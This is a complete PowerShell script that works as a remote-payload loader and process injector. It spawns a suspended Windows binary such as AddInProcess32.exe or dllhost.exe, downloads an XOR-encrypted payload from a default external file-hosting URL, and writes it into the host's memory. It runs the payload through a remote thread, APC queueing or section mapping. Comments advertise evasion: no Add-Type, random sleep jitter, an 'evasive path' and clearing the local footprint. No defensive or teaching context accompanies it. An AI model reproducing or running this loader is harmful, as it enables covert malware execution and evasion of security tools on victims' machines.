param(
    [string]$Target,
    [string]$Url = "https://files.catbox.moe/nfasiv.bin",
    [string]$Key = "",
    [switch]$RequireRWX,
    [switch]$UseApc,
    [switch]$UseSection
)

# ============================================================
# Pure-reflection native API setup — no Add-Type, no temp DLL
# ============================================================

$assemblyName = New-Object System.Reflection.AssemblyName("EniRuntime")
$assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($assemblyName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$moduleBuilder = $assemblyBuilder.DefineDynamicModule("EniModule")

function New-DelegateType {
    param([Type[]]$Params, [Type]$ReturnType)
    $typeBuilder = $moduleBuilder.DefineType(
        "D_" + [Guid]::NewGuid().ToString("N"),
        [System.Reflection.TypeAttributes]::Class -bor [System.Reflection.TypeAttributes]::Public -bor [System.Reflection.TypeAttributes]::Sealed,
        [System.MulticastDelegate]
    )
    $ctor = $typeBuilder.DefineConstructor(
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::HideBySig -bor [System.Reflection.MethodAttributes]::SpecialName -bor [System.Reflection.MethodAttributes]::RTSpecialName,
        [System.Reflection.CallingConventions]::Standard,
        @([Object], [IntPtr])
    )
    $ctor.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime)
    $invoke = $typeBuilder.DefineMethod(
        "Invoke",
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::HideBySig -bor [System.Reflection.MethodAttributes]::NewSlot -bor [System.Reflection.MethodAttributes]::Virtual,
        $ReturnType,
        $Params
    )
    $invoke.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime)
    return $typeBuilder.CreateType()
}

# Define delegates using raw pointers for structs to avoid layout issues
$D_CreateProcessW = New-DelegateType -ReturnType ([bool]) -Params @(([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([bool]), ([uint32]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]))
$D_NtAllocateVirtualMemory = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([IntPtr].MakeByRefType()), ([IntPtr]), ([IntPtr].MakeByRefType()), ([uint32]), ([uint32]))
$D_NtProtectVirtualMemory = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([IntPtr].MakeByRefType()), ([IntPtr].MakeByRefType()), ([uint32]), ([uint32].MakeByRefType()))
$D_NtWriteVirtualMemory = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([IntPtr]), ([byte[]]), ([uint32]), ([uint32].MakeByRefType()))
$D_NtCreateThreadEx = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr].MakeByRefType()), ([uint32]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([bool]), ([uint32]), ([uint32]), ([uint32]), ([IntPtr]))
$D_NtQueueApcThread = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr]))
$D_NtResumeThread = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([uint32].MakeByRefType()))
$D_NtCreateSection = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr].MakeByRefType()), ([uint32]), ([IntPtr]), ([IntPtr].MakeByRefType()), ([uint32]), ([uint32]), ([IntPtr]))
$D_NtMapViewOfSection = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([IntPtr]), ([IntPtr].MakeByRefType()), ([IntPtr]), ([IntPtr]), ([IntPtr]), ([IntPtr].MakeByRefType()), ([uint32]), ([uint32]), ([uint32]))
$D_NtUnmapViewOfSection = New-DelegateType -ReturnType ([int]) -Params @(([IntPtr]), ([IntPtr]))
$D_CloseHandle = New-DelegateType -ReturnType ([bool]) -Params @(([IntPtr]))

# Resolve Win32Native reflection helpers
$win32Native = [System.Type]::GetType('Microsoft.Win32.Win32Native')
$getModuleHandle = $win32Native.GetMethod('GetModuleHandle', [System.Reflection.BindingFlags]'NonPublic,Static', $null, @([string]), $null)
$getProcAddress = $win32Native.GetMethod('GetProcAddress', [System.Reflection.BindingFlags]'NonPublic,Static', $null, @([IntPtr], [string]), $null)

function Get-ProcAddress {
    param([string]$Module, [string]$Name)
    $hMod = $getModuleHandle.Invoke($null, @($Module))
    if ($hMod -eq [IntPtr]::Zero) { throw "Failed to get handle for $Module" }
    $ptr = $getProcAddress.Invoke($null, @($hMod, $Name))
    if ($ptr -eq [IntPtr]::Zero) { throw "Failed to resolve $Name" }
    return $ptr
}

# Bind native functions
$CreateProcessW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'CreateProcessW'), $D_CreateProcessW)
$NtAllocateVirtualMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtAllocateVirtualMemory'), $D_NtAllocateVirtualMemory)
$NtProtectVirtualMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtProtectVirtualMemory'), $D_NtProtectVirtualMemory)
$NtWriteVirtualMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtWriteVirtualMemory'), $D_NtWriteVirtualMemory)
$NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtCreateThreadEx'), $D_NtCreateThreadEx)
$NtQueueApcThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtQueueApcThread'), $D_NtQueueApcThread)
$NtResumeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtResumeThread'), $D_NtResumeThread)
$NtCreateSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtCreateSection'), $D_NtCreateSection)
$NtMapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtMapViewOfSection'), $D_NtMapViewOfSection)
$NtUnmapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'ntdll.dll' 'NtUnmapViewOfSection'), $D_NtUnmapViewOfSection)
$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress 'kernel32.dll' 'CloseHandle'), $D_CloseHandle)

# ============================================================
# Helpers
# ============================================================

function Invoke-XorDecrypt {
    param([byte[]]$Data, [string]$Key)
    if ([string]::IsNullOrEmpty($Key)) { return $Data }
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $out = New-Object byte[] $Data.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $out[$i] = $Data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return $out
}

# ============================================================
# Host selection
# ============================================================

$hostPath = $null
if ($Target) {
    $hostPath = $Target
    Write-Host "User-specified host: $hostPath"
} else {
    $netDirs = @(
        "C:\Windows\Microsoft.NET\Framework64\v4.0.30319",
        "C:\Windows\Microsoft.NET\Framework\v4.0.30319",
        "C:\Windows\Microsoft.NET\Framework64\v2.0.50727",
        "C:\Windows\Microsoft.NET\Framework\v2.0.50727"
    )
    foreach ($dir in $netDirs) {
        $candidate = Join-Path $dir "AddInProcess32.exe"
        if (Test-Path $candidate) {
            $hostPath = $candidate
            break
        }
    }
    if (-not $hostPath) {
        $candidates = @(
            "C:\Windows\System32\RuntimeBroker.exe",
            "C:\Windows\SysWOW64\RuntimeBroker.exe",
            "C:\Windows\System32\dllhost.exe",
            "C:\Windows\SysWOW64\dllhost.exe",
            "C:\Windows\System32\WerFault.exe",
            "C:\Windows\SysWOW64\WerFault.exe"
        )
        foreach ($p in $candidates) {
            if (Test-Path $p) {
                $hostPath = $p
                break
            }
        }
    }
}

if (-not $hostPath) {
    throw "No suitable host process found."
}
Write-Host "Selected host: $hostPath"

# ============================================================
# Execution
# ============================================================

$jitter = Get-Random -Minimum 1200 -Maximum 2800
Start-Sleep -Milliseconds $jitter

# Build STARTUPINFO (104 bytes on x64 Unicode) and PROCESS_INFORMATION (24 bytes) manually
$siSize = if ([IntPtr]::Size -eq 8) { 104 } else { 68 }
$piSize = if ([IntPtr]::Size -eq 8) { 24 } else { 16 }
$siPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($siSize)
$piPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($piSize)
[System.Runtime.InteropServices.Marshal]::WriteInt32($siPtr, 0, $siSize)
for ($i = 4; $i -lt $siSize; $i += 8) {
    [System.Runtime.InteropServices.Marshal]::WriteInt64($siPtr, $i, 0)
}
for ($i = 0; $i -lt $piSize; $i += 8) {
    [System.Runtime.InteropServices.Marshal]::WriteInt64($piPtr, $i, 0)
}

$CREATE_SUSPENDED = 0x00000004
$CREATE_NO_WINDOW = 0x08000000

$cmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$hostPath`"")
try {
    $ok = $CreateProcessW.Invoke([IntPtr]::Zero, $cmdLinePtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, ($CREATE_SUSPENDED -bor $CREATE_NO_WINDOW), [IntPtr]::Zero, [IntPtr]::Zero, $siPtr, $piPtr)
} finally {
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($cmdLinePtr)
}

if (-not $ok) {
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($siPtr)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($piPtr)
    throw "CreateProcessW failed."
}

$hProcess = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, 0)
$hThread = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, [IntPtr]::Size)
$dwProcessId = [System.Runtime.InteropServices.Marshal]::ReadInt32($piPtr, [IntPtr]::Size * 2)

[System.Runtime.InteropServices.Marshal]::FreeHGlobal($siPtr)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($piPtr)

Write-Host "Host spawned. PID: $dwProcessId"

# Download payload
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$encrypted = $wc.DownloadData($Url)
Write-Host "Downloaded $($encrypted.Length) bytes from $Url"

# Decrypt in local memory
$payload = Invoke-XorDecrypt -Data $encrypted -Key $Key

$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READ = 0x20
$PAGE_EXECUTE_READWRITE = 0x40

if ($UseSection) {
    # Evasive path: use a file-backed section mapped into both local and remote processes
    $sectionHandle = [IntPtr]::Zero
    $maxSize = [IntPtr]$payload.Length
    $SECTION_ALL_ACCESS = 0xF001F
    $SEC_COMMIT = 0x8000000

    $status = $NtCreateSection.Invoke([ref]$sectionHandle, $SECTION_ALL_ACCESS, [IntPtr]::Zero, [ref]$maxSize, $PAGE_EXECUTE_READWRITE, $SEC_COMMIT, [IntPtr]::Zero)
    if ($status -ne 0) {
        throw "NtCreateSection failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }

    # Map a writable view into our own process so we can copy the payload in
    $localBase = [IntPtr]::Zero
    $viewSize = [IntPtr]$payload.Length
    $status = $NtMapViewOfSection.Invoke($sectionHandle, [IntPtr]::MinusOne, [ref]$localBase, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$viewSize, 1, 0, $PAGE_READWRITE)
    if ($status -ne 0) {
        throw "NtMapViewOfSection (local) failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }

    [System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $localBase, $payload.Length)

    # Unmap local view before mapping execute view in target
    $status = $NtUnmapViewOfSection.Invoke([IntPtr]::MinusOne, $localBase)
    if ($status -ne 0) {
        throw "NtUnmapViewOfSection failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }

    # Map execute view into remote process
    $baseAddress = [IntPtr]::Zero
    $regionSize = [IntPtr]$payload.Length
    $execProtect = if ($RequireRWX) { $PAGE_EXECUTE_READWRITE } else { $PAGE_EXECUTE_READ }
    $status = $NtMapViewOfSection.Invoke($sectionHandle, $hProcess, [ref]$baseAddress, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$regionSize, 1, 0, $execProtect)
    if ($status -ne 0) {
        throw "NtMapViewOfSection (remote) failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }
    [void]$CloseHandle.Invoke($sectionHandle)
    Write-Host "Mapped remote executable view at 0x$($baseAddress.ToString('X'))"
} else {
    # Standard path: allocate RW, write, then flip to execute
    $baseAddress = [IntPtr]::Zero
    $regionSize = [IntPtr]$payload.Length

    $status = $NtAllocateVirtualMemory.Invoke($hProcess, [ref]$baseAddress, [IntPtr]::Zero, [ref]$regionSize, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_READWRITE)
    if ($status -ne 0) {
        throw "NtAllocateVirtualMemory failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }
    Write-Host "Allocated remote memory at 0x$($baseAddress.ToString('X'))"

    $bytesWritten = 0
    $status = $NtWriteVirtualMemory.Invoke($hProcess, $baseAddress, $payload, [uint32]$payload.Length, [ref]$bytesWritten)
    if ($status -ne 0) {
        throw "NtWriteVirtualMemory failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }
    Write-Host "Wrote $bytesWritten bytes into host process"

    $finalProtect = if ($RequireRWX) { $PAGE_EXECUTE_READWRITE } else { $PAGE_EXECUTE_READ }
    $oldProtect = 0
    $status = $NtProtectVirtualMemory.Invoke($hProcess, [ref]$baseAddress, [ref]$regionSize, $finalProtect, [ref]$oldProtect)
    if ($status -ne 0) {
        throw "NtProtectVirtualMemory failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }
    Write-Host "Memory protection changed to $(if($RequireRWX){'RWX'}else{'RX'})"
}

# Cleanup local footprint
$encrypted = $null
$payload = $null
[System.GC]::Collect()

# Execute
if ($UseApc) {
    Write-Host "Queueing APC on main thread..."
    $status = $NtQueueApcThread.Invoke($hThread, $baseAddress, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($status -ne 0) {
        throw "NtQueueApcThread failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }
    $suspendCount = 0
    $status = $NtResumeThread.Invoke($hThread, [ref]$suspendCount)
    if ($status -ne 0) {
        throw "NtResumeThread failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }
    Write-Host "Host resumed. Monitoring..."
} else {
    $threadHandle = [IntPtr]::Zero
    $THREAD_ALL_ACCESS = 0x1FFFFF
    $status = $NtCreateThreadEx.Invoke([ref]$threadHandle, $THREAD_ALL_ACCESS, [IntPtr]::Zero, $hProcess, $baseAddress, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
    if ($status -ne 0) {
        throw "NtCreateThreadEx failed. NTSTATUS: 0x$($status.ToString('X8'))"
    }
    [void]$CloseHandle.Invoke($threadHandle)
    Write-Host "Remote thread created. Monitoring host process..."
}

# Monitor
$hostProc = Get-Process -Id $dwProcessId -ErrorAction SilentlyContinue
while ($hostProc -and -not $hostProc.HasExited) {
    $hostProc.Refresh()
    $ws = [math]::Round($hostProc.WorkingSet64 / 1KB, 2)
    $tc = $hostProc.Threads.Count
    Write-Host "$(Get-Date -Format 'HH:mm:ss') | PID: $dwProcessId | WS: ${ws} KB | Threads: $tc"
    Start-Sleep -Seconds 8
    $hostProc = Get-Process -Id $dwProcessId -ErrorAction SilentlyContinue
}

try {
    $exitCode = $hostProc.ExitCode
    Write-Host "Host process exited with code: $exitCode"
} catch {
    Write-Host "Host process exited."
}

# Cleanup handles
[void]$CloseHandle.Invoke($hThread)
[void]$CloseHandle.Invoke($hProcess)
